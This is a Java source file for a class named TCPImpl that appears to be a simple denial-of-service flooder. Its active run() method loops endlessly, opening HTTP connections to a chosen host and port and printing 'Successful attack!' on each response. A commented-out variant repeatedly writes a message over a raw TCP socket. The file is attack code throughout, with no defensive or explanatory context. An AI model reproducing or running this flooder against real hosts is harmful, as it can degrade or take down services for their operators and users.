import java.io.*;
import java.net.*;

public class TCPImpl implements Runnable  {

    private Socket socket;
    private SocketAddress socketAddress;
    private BufferedWriter writer;
    private OutputStreamWriter outputStreamWriter;
    private String hostname;
    private String msg;
    private int port;
    private int threads;
    private Thread t;


    public TCPImpl(String hostname, int port, int threads, String msg){
        this.hostname = hostname;
        this.port = port;
        this.threads = threads;
        this.msg = msg;
    }

/*    @Override
    public void run() {
        System.out.println("Trying to initialize socket");
        initializeConnection();
        System.out.println("Initialize socket!");
        System.out.println("Trying to connect!");
        connectToSocket();
        System.out.println("Connected!");
        while(!Thread.currentThread().isInterrupted() && (socket.isConnected() && !socket.isClosed())){
            System.out.println("Trying writing to socket!");
            writeToSocket("something something");
            System.out.println("Wrote to socket!");
            System.out.println("Current thread is interrupted: " + Thread.currentThread().isInterrupted() + ".\nIs bound?: " + socket.isBound());
            try {
                Thread.sleep(100);
                System.out.println("Sleeping!");
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        stopSocketConnection();
        System.out.println("Connection stopped");
    }*/

    @Override
    public void run() {
        while(true){
            try {
                URL url = new URL("http://" + getHostname() + ":" + getPort() + "/");
                URLConnection conn = url.openConnection();
                System.out.println("Connection success!");
                BufferedInputStream bufferedInputStream = new BufferedInputStream(conn.getInputStream());
                byte[] bytes = new byte[1024];
                int len = -1;
                StringBuffer sb = new StringBuffer();

                if(bufferedInputStream != null){
                    if((len = bufferedInputStream.read()) != -1){
                        System.out.println("Successful attack!");
                        bufferedInputStream.close();
                    }
                }
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public void initializeConnection() {
        System.out.println(getHostname());
        setSocketAddress(new InetSocketAddress(getHostname(), getPort()));
        socket = new Socket();
        try {
            socket.setKeepAlive(true);
            socket.setSoTimeout(1);
        } catch (SocketException e) {
            e.printStackTrace();
        }
    }

    public void connectToSocket(){
        System.out.println("Trying to connect!");
        if(socket != null && !socket.isBound()){
            try {
                socket.connect(getSocketAddress());
                System.out.println("Connected!");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public void stopSocketConnection() {
        if(socket != null && !socket.isClosed() && socket.isBound()){
            try {
                socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public void writeToSocket(String msg){
        try(BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(getSocket().getOutputStream()))) {
            bw.write(getMsg());
            bw.flush();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    public Socket getSocket() {
        return socket;
    }

    public void setSocket(Socket socket) {
        this.socket = socket;
    }

    public SocketAddress getSocketAddress() {
        return socketAddress;
    }

    public void setSocketAddress(SocketAddress socketAddress) {
        this.socketAddress = socketAddress;
    }

    public String getHostname() {
        return hostname;
    }

    public void setHostname(String hostname) {
        this.hostname = hostname;
    }

    public String getMsg() {
        return msg;
    }

    public void setMsg(String msg) {
        this.msg = msg;
    }

    public int getPort() {
        return port;
    }

    public void setPort(int port) {
        this.port = port;
    }

    public int getThreads() {
        return threads;
    }

    public void setThreads(int threads) {
        this.threads = threads;
    }

    @Override
    public String toString() {
        return "TCPImpl{" +
                "hostname='" + hostname + '\'' +
                ", msg='" + msg + '\'' +
                ", port=" + port +
                ", threads=" + threads +
                '}';
    }
}
